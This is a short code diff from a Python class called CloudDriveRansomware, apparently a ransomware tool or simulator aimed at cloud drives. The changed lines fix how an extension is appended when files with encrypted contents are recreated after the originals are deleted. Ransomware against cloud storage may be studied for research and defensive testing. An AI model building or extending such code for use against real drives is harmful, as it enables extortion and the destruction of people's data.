@@ -89,8 +89,8 @@ class CloudDriveRansomware:
         self._second_stage_deletion_finished_callback(paths_to_encrypted_contents)
 
         for cloud_file_path, new_file_content in paths_to_encrypted_contents.items():
-            print(f"Creating file with encrypted contents: {cloud_file_path}.{file_extension}")
-            self._cloud_drive.create_file(f"{cloud_file_path}.{file_extension}", new_file_content)
+            print(f"Creating file with encrypted contents: {cloud_file_path}{file_extension}")
+            self._cloud_drive.create_file(f"{cloud_file_path}{file_extension}", new_file_content)
         self._third_stage_recreation_finished_callback(paths_to_encrypted_contents)
 
     
